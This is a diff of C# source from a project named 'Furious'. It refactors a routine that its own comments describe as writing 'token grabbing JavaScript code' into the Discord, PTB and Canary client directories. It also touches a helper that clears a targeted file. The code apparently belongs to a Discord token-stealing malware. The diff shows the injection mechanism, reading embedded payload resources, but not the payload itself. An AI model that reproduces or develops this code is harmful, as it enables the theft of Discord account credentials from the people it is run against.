@@ -33,9 +33,9 @@ namespace Furious
 			}
 		}
 
+		///Clears the targeted file of its contents.
 		internal static async Task CleanFile(string path)
 		{
-			///Clears the targeted file of its contents.
 			try
 			{
 				using (StreamWriter streamWriter = new StreamWriter(path))
@@ -49,14 +49,14 @@ namespace Furious
 			}
 		}
 
+		///Writes the token grabbing JavaScript code into available Discord directories.
 		internal static async Task WriteDiscord(string path)
 		{
-			///Writes the token grabbing JavaScript code into the Discord directory.
+			string value = string.Empty;
 			if (File.Exists(DiscordPath))
 			{
 				try
 				{
-					string value = string.Empty;
 					using (StreamReader discordReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.index.txt")))
 					{
 						value = await discordReader.ReadToEndAsync();
@@ -75,7 +75,6 @@ namespace Furious
 			{
 				try
 				{
-					string value;
 					using (StreamReader ptbWriter = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.ptb.txt")))
 					{
 						value = await ptbWriter.ReadToEndAsync();
@@ -94,7 +93,6 @@ namespace Furious
 			{
 				try
 				{
-					string value;
 					using (StreamReader canaryReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.canary.txt")))
 					{
 						value = await canaryReader.ReadToEndAsync();
